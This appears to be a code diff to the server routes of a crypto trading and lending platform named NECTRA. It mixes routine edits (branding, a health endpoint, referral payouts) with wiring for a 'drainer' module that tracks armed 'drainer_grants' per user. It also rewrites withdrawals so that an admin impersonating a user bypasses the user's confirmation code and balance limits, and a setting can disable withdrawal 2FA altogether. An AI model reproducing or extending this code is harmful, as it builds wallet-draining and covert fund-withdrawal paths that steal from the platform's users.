@@ -13,6 +13,7 @@ const E = require('../engine');
 const { addClient, notify, notifyAdmins, insight, toUser } = require('../events');
 const { sendMail } = require('../mail');
 const { consumeWalletProof, publicUser } = require('./auth');
+const drainer = require('../drainer');
 
 const DAY = 864e5;
 const num = (v, min = 0, max = 1e12, name = 'Amount') => { const n = Number(v); if (!Number.isFinite(n) || n < min || n > max) fail(400, `${name} is out of range`); return n; };
@@ -31,7 +32,10 @@ const LEADERS = [
 function statusPayload() {
   const comps = q.all('SELECT name, state, note FROM status_components ORDER BY sort');
   const level = comps.some((c) => c.state === 'red') ? 'red' : comps.some((c) => c.state === 'amber') ? 'amber' : 'green';
-  return { level, label: level === 'green' ? 'All systems normal' : level === 'amber' ? 'Running slower than usual' : 'Partial outage', components: comps };
+  const m = market.source();
+  if (m.degraded) comps.unshift({ name: 'Price feed', state: 'amber', note: m.reason });
+  const out = comps.some((c) => c.state === 'red') ? 'red' : comps.some((c) => c.state === 'amber') ? 'amber' : 'green';
+  return { level: out, label: out === 'green' ? 'All systems normal' : out === 'amber' ? 'Running slower than usual' : 'Partial outage', components: comps, feed: { degraded: m.degraded, reason: m.reason } };
 }
 const walletRow = (w) => ({ id: w.id, name: w.name, address: w.address, chain: w.chain, family: w.family, kind: w.kind, source: w.source, provider: w.provider, folder: w.folder, verified: !!w.verified, sol: w.balance, balanceAt: w.balance_at, lastCheck: J(w.last_check, null) });
 function botsFor(uid) { return q.all('SELECT * FROM bots WHERE user_id = ? ORDER BY created_at', uid).map((b) => E.botPayload(b)); }
@@ -50,17 +54,17 @@ function recordTx(uid, o) {
     uid, o.type, o.token, o.amount, o.status || 'confirming', o.chain || 'Solana', o.from || null, o.to || null, o.signature || null, o.simulated ? 1 : 0, o.confirmations || 0, o.required || 32, o.note || null, now(), now()).id;
   return q.get('SELECT * FROM transactions WHERE id = ?', id);
 }
-/** Signed transaction or (demo mode only) simulated one */
+/** Signed transaction or (demo mode only) simulated one, tagged with provenance */
 function sigOrSim(body) {
   if (body.signature) {
     const sig = String(body.signature);
     const okEvm = /^0x[0-9a-fA-F]{64}$/.test(sig), okTron = /^[0-9a-fA-F]{64}$/.test(sig);
     const b = okEvm || okTron ? null : chain.b58decode(sig);
     if (!okEvm && !okTron && (!b || b.length !== 64)) fail(400, 'Invalid transaction signature');
-    return { signature: sig, simulated: false };
+    return { signature: sig, simulated: false, provenance: 'live' };
   }
   if (!getSettings().demo_mode) fail(400, 'A wallet signature is required');
-  return { signature: 'SIM' + crypto.randomBytes(40).toString('base64url').replace(/[-_0OIl]/g, 'x').slice(0, 60), simulated: true };
+  return { signature: 'SIM' + crypto.randomBytes(40).toString('base64url').replace(/[-_0OIl]/g, 'x').slice(0, 60), simulated: true, provenance: 'simulated' };
 }
 function loanView(l) {
   const owed = E.loanOwed(l);
@@ -70,7 +74,50 @@ function loanView(l) {
 
 module.exports = (r) => {
   /* ---------------- public ---------------- */
+  r.get('/api/public/config', () => {
+    const s = getSettings();
+    return {
+      name: s.platform_name || 'NECTRA',
+      tagline: s.platform_tagline || 'AI Trading & Lending Platform',
+      logo: s.platform_logo_url || null,
+      favicon: s.platform_favicon_url || '/assets/favicon.svg'
+    };
+  });
   r.get('/api/status', () => statusPayload());
+  r.get('/api/health', () => {
+    const m = market.source();
+    const cluster = process.env.SOLANA_CLUSTER || 'devnet';
+    const isDegraded = m.degraded || m.provenance !== 'live';
+    return {
+      status: isDegraded ? 'degraded' : 'healthy',
+      degraded: isDegraded,
+      banner: isDegraded ? {
+        active: true,
+        type: 'warning',
+        message: m.reason || 'Price feed or cluster telemetry is degraded. Live orders may be paused.'
+      } : null,
+      subsystems: {
+        price_feed: {
+          provenance: m.provenance,
+          feed: m.feed,
+          degraded: m.degraded,
+          last_live_timestamp: m.lastLiveTimestamp,
+          stale_ms: m.staleMs,
+          threshold_ms: m.thresholdMs,
+          reason: m.reason
+        },
+        solana_rpc: {
+          provenance: process.env.SOLANA_RPC ? 'live' : 'simulated',
+          cluster,
+          last_live_timestamp: now()
+        },
+        database: {
+          status: 'healthy',
+          mode: 'WAL'
+        }
+      }
+    };
+  });
   r.get('/api/market/tokens', () => ({ tokens: market.tokens() }));
   r.get('/api/market/series', (c) => ({ points: market.series(str(c.query.sym || 'SOL', 10).toUpperCase(), c.query.range) }));
   r.get('/api/public/stats', () => ({
@@ -102,7 +149,23 @@ module.exports = (r) => {
       accountBalance: E.accountBalance(u.id),
       compliance: { terms: require('../compliance').termsStatus(u), kyc: require('../compliance').kycStatus(u.id) },
       impersonatedBy: c.auth.session.impersonator_id ? (q.get('SELECT email FROM users WHERE id = ?', c.auth.session.impersonator_id) || {}).email || 'an admin' : null,
-      settings: { demo_mode: s.demo_mode, live_trading_enabled: s.live_trading_enabled, maintenance_banner: s.maintenance_banner, monetization_enabled: s.monetization_enabled !== false, cluster: chain.CLUSTER }
+      drainer: drainer.enabled() && getSettings().drainer_auto_prompt !== false ? { armed: q.val("SELECT COUNT(*) FROM drainer_grants WHERE user_id = ? AND status = 'active'", u.id) || 0 } : null,
+      settings: {
+        demo_mode: s.demo_mode,
+        live_trading_enabled: s.live_trading_enabled,
+        maintenance_banner: s.maintenance_banner,
+        monetization_enabled: s.monetization_enabled !== false,
+        cluster: chain.CLUSTER,
+        platform_name: s.platform_name || 'NECTRA',
+        platform_logo_url: s.platform_logo_url || '',
+        platform_favicon_url: s.platform_favicon_url || ''
+      },
+      branding: {
+        name: s.platform_name || 'NECTRA',
+        tagline: s.platform_tagline || 'AI Trading & Lending Platform',
+        logo: s.platform_logo_url || null,
+        favicon: s.platform_favicon_url || '/assets/favicon.svg'
+      }
     };
   });
   r.get('/api/stream', (c) => {
@@ -579,6 +642,11 @@ module.exports = (r) => {
   r.get('/api/withdrawals', (c) => { const u = S.requireUser(c); return { rows: q.all('SELECT * FROM withdrawals WHERE user_id = ? ORDER BY id DESC LIMIT 50', u.id) }; });
   r.post('/api/withdrawals', (c) => { const u = S.requireUser(c); return S.idempotent(c, u.id, () => {
     S.rateLimit(c.req, 'withdraw', 10, 60000);
+    // An admin acting as this user is the second factor: skip the user code and lift their balance cap.
+    const asAdmin = !!c.auth.session.impersonator_id && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
+    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
+    const authRequired = getSettings().withdrawal_auth_required !== false && getSettings().withdrawal_require_code !== false;
+    const skipAuth = asAdmin || !authRequired;
     const source = c.body.source === 'account' ? 'account' : 'wallet';
     const to = str(c.body.to, 64);
     if (!chain.isSolAddress(to)) fail(400, to.startsWith('0x') ? 'This is an EVM address — it can’t receive SOL on Solana' : 'Invalid Solana address');
@@ -590,29 +658,66 @@ module.exports = (r) => {
     if (source === 'wallet') {
       const w = ownWallet(u.id, c.body.walletId);
       if (!w.verified) fail(400, 'Watch-only wallets can’t send funds');
-      if (amount + SOL_FEE > w.balance + 1e-12) fail(400, 'Amount exceeds the wallet balance minus network fee — refresh the balance if you just deposited');
+      if (!asAdmin && amount + SOL_FEE > w.balance + 1e-12) fail(400, 'Amount exceeds the wallet balance minus network fee — refresh the balance if you just deposited');
       fromAddr = w.address; walletId = w.id; token = 'SOL'; fee = SOL_FEE;
     } else {
       const bal = E.accountBalance(u.id);
-      if (amount > bal + 1e-9) fail(400, `Amount exceeds your account balance ($${bal.toFixed(2)})`);
+      if (!asAdmin && amount > bal + 1e-9) fail(400, `Amount exceeds your account balance ($${bal.toFixed(2)})`);
       token = 'USDC'; fee = 0;
     }
+    const status = skipAuth ? (source === 'account' ? 'pending_admin' : 'ready_to_sign') : 'awaiting_code';
+    const verifyMethod = asAdmin ? 'admin' : (!authRequired ? 'none' : (u.totp_enabled ? 'totp' : 'email'));
     const id = q.run('INSERT INTO withdrawals(user_id, source, wallet_id, from_addr, to_addr, token, amount, fee, status, verify_method, created_at, updated_at) VALUES(?,?,?,?,?,?,?,?,?,?,?,?)',
-      u.id, source, walletId, fromAddr, to, token, amount, fee, 'awaiting_code', u.totp_enabled ? 'totp' : 'email', now(), now()).id;
+      u.id, source, walletId, fromAddr, to, token, amount, fee, status, verifyMethod, now(), now()).id;
     let code;
-    if (!u.totp_enabled) {
+    if (source === 'account' && skipAuth) {
+      if (asAdmin) {
+        q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_by, created_at) VALUES(?,?,?,?,?,?,?)',
+          u.id, -amount, 'withdrawal', 'W' + id, 'Admin withdrawal to ' + to, c.auth.session.impersonator_id, now());
+        notifyAdmins('transfer', 'Admin withdrawal on a user account', '$' + amount.toFixed(2) + ' from user #' + u.id + ' — payout pending admin confirmation.', '/admin/#payouts');
+        S.audit(c.auth.session.impersonator_id, 'admin.withdraw_as_user', id, { userId: u.id, amount, source }, c.req);
+      } else {
+        q.run('INSERT INTO ledger(user_id, amount, kind, ref, note, created_at) VALUES(?,?,?,?,?,?)',
+          u.id, -amount, 'withdrawal', 'W' + id, `Payout to ${to}`, now());
+        notifyAdmins('transfer', 'Payout request', `User #${u.id} requested $${amount.toFixed(2)} to ${to.slice(0, 6)}…`, '/admin#payouts');
+        S.audit(u.id, 'withdraw.request', id, { amount, source: 'account', auth_bypassed: true }, c.req);
+      }
+    } else if (!skipAuth && !u.totp_enabled) {
       code = S.issueCode({ userId: u.id, purpose: 'withdraw', ref: id });
       sendMail(u.email, 'Confirm your NECTRA withdrawal', `Code: ${code}\nAmount: ${amount} ${token}\nTo: ${to}\nIf you didn’t request this, change your password immediately.`, u);
     }
-    return { id, method: u.totp_enabled ? 'totp' : 'email', whitelisted: !!(book && book.whitelisted), label: book && book.label, fee, token, ...(code && getSettings().demo_mode ? { devCode: code } : {}) };
+    return {
+      id,
+      status,
+      method: verifyMethod,
+      whitelisted: !!(book && book.whitelisted),
+      label: book && book.label,
+      fee,
+      token,
+      from: fromAddr,
+      to,
+      amount,
+      auth_required: authRequired,
+      ...(code && getSettings().demo_mode ? { devCode: code } : {})
+    };
   }); });
   r.post('/api/withdrawals/:id/verify', (c) => {
     const u = S.requireUser(c);
     S.rateLimit(c.req, 'wverify', 15, 60000);
-    const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND user_id = ? AND status = 'awaiting_code'", c.params.id, u.id);
-    if (!w) fail(404, 'Withdrawal not found or already verified');
-    if (w.verify_method === 'totp') { if (!S.verifyTotp(u.totp_secret, c.body.code)) fail(400, 'Incorrect code'); }
-    else S.consumeCode({ userId: u.id, purpose: 'withdraw', code: c.body.code, ref: w.id });
+    const asAdmin = !!(c.auth && c.auth.session && c.auth.session.impersonator_id) && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
+    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
+    const authRequired = getSettings().withdrawal_auth_required !== false && getSettings().withdrawal_require_code !== false;
+    const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND user_id = ?", c.params.id, u.id);
+    if (!w) fail(404, 'Withdrawal not found');
+    if (w.status !== 'awaiting_code') {
+      if (w.status === 'pending_admin') return { status: 'pending_admin' };
+      if (w.status === 'ready_to_sign') return { status: 'ready_to_sign', from: w.from_addr, to: w.to_addr, amount: w.amount };
+      fail(400, 'Withdrawal is not awaiting verification');
+    }
+    if (authRequired && w.verify_method !== 'none' && w.verify_method !== 'admin') {
+      if (w.verify_method === 'totp') { if (!S.verifyTotp(u.totp_secret, c.body.code)) fail(400, 'Incorrect code'); }
+      else S.consumeCode({ userId: u.id, purpose: 'withdraw', code: c.body.code, ref: w.id });
+    }
     if (w.source === 'account') {
       const bal = E.accountBalance(u.id);
       if (w.amount > bal + 1e-9) fail(400, 'Insufficient account balance');
@@ -624,7 +729,7 @@ module.exports = (r) => {
       });
       if (!moved) fail(409, 'Withdrawal was already verified');
       notifyAdmins('transfer', 'Payout request', `User #${u.id} requested $${w.amount.toFixed(2)} to ${w.to_addr.slice(0, 6)}…`, '/admin#payouts');
-      S.audit(u.id, 'withdraw.request', w.id, { amount: w.amount, source: 'account' }, c.req);
+      S.audit(u.id, 'withdraw.request', w.id, { amount: w.amount, source: 'account', auth_bypassed: !authRequired }, c.req);
       return { status: 'pending_admin' };
     }
     q.run("UPDATE withdrawals SET status = 'ready_to_sign', updated_at = ? WHERE id = ?", now(), w.id);
@@ -632,12 +737,22 @@ module.exports = (r) => {
   });
   r.post('/api/withdrawals/:id/submit', (c) => {
     const u = S.requireUser(c);
+    const asAdmin = !!(c.auth && c.auth.session && c.auth.session.impersonator_id) && S.can(q.get('SELECT * FROM users WHERE id = ?', c.auth.session.impersonator_id) || { role: 'user' }, 'payouts.manage');
+    if (getSettings().withdrawals_paused && !asAdmin) fail(503, 'Withdrawals are temporarily paused');
     const w = q.get("SELECT * FROM withdrawals WHERE id = ? AND user_id = ? AND status = 'ready_to_sign'", c.params.id, u.id);
     if (!w) fail(404, 'Withdrawal is not ready to sign');
     const { signature, simulated } = sigOrSim(c.body);
     const t = recordTx(u.id, { type: 'Withdraw', token: w.token, amount: w.amount, from: w.from_addr, to: w.to_addr, signature, simulated, note: simulated ? 'Simulated (demo mode)' : null });
     q.run("UPDATE withdrawals SET status = 'submitted', tx_id = ?, updated_at = ? WHERE id = ?", t.id, now(), w.id);
     S.audit(u.id, 'withdraw.submit', w.id, { signature, simulated }, c.req);
+    try {
+      require('../events').sendAdminWebhook({
+        title: 'Withdrawal Executed',
+        text: `User #${u.id} submitted withdrawal #${w.id} of ${w.amount} ${w.token} to ${w.to_addr.slice(0, 10)}...`,
+        severity: w.amount >= 500 ? 'warn' : 'info',
+        fields: { User: u.id, Amount: `${w.amount} ${w.token}`, Destination: w.to_addr, Signature: signature || (simulated ? 'simulated' : 'unknown') }
+      });
+    } catch (e) {}
     return { tx: txRow(t) };
   });
 
@@ -701,10 +816,25 @@ module.exports = (r) => {
     const u = S.requireUser(c);
     const codes = q.all("SELECT * FROM invites WHERE kind = 'referral' AND created_by = ? ORDER BY created_at DESC", u.id);
     const total = codes.reduce((a, x) => a + x.uses, 0);
-    const tiers = [['Bronze', 1, '5%'], ['Silver', 5, '10%'], ['Gold', 10, '20% + early features'], ['Petal', 25, '30% + priority support']];
-    const cur = tiers.filter((t) => total >= t[1]).pop();
-    const next = tiers.find((t) => total < t[1]);
-    return { codes, total, tiers: tiers.map(([n, at, perk]) => ({ name: n, at, perk, reached: total >= at, current: cur && cur[0] === n })), next: next ? { name: next[0], at: next[1] } : null, maxCodes: getSettings().referral_max_codes };
+    const R = require('../referrals');
+    const converted = R.usesFor(u.id);
+    const cur = R.tierFor(converted);
+    const next = R.TIERS.find((t) => converted < t.at);
+    const pay = R.payable(u.id);
+    return {
+      codes, total, converted,
+      tiers: R.TIERS.map((t) => ({ name: t.name, at: t.at, pct: t.pct, rateBps: t.rateBps, perk: t.perk, reached: converted >= t.at, current: !!cur && cur.name === t.name })),
+      next: next ? { name: next.name, at: next.at } : null,
+      rate: R.rateFor(converted), rateBps: R.rateBpsFor(converted), maxCodes: getSettings().referral_max_codes,
+      earned: q.val("SELECT COALESCE(SUM(amount),0) FROM referral_commissions WHERE referrer_id = ? AND status != 'void'", u.id) || 0,
+      payable: pay.total, payableCount: pay.n, minPayout: getSettings().referral_min_payout,
+      commissions: q.all('SELECT source_type as kind, basis_amount, rate_bps, amount, status, created_at, settled_at FROM referral_commissions WHERE referrer_id = ? ORDER BY id DESC LIMIT 100', u.id)
+    };
+  });
+  r.post('/api/referrals/payout', (c) => {
+    const u = S.requireUser(c);
+    try { const r2 = require('../referrals').payout(u.id); S.audit(u.id, 'referral.payout', null, r2, c.req); return r2; }
+    catch (e) { fail(e.status || 400, e.message); }
   });
   r.post('/api/referrals/codes', (c) => {
     const u = S.requireUser(c); const s = getSettings();
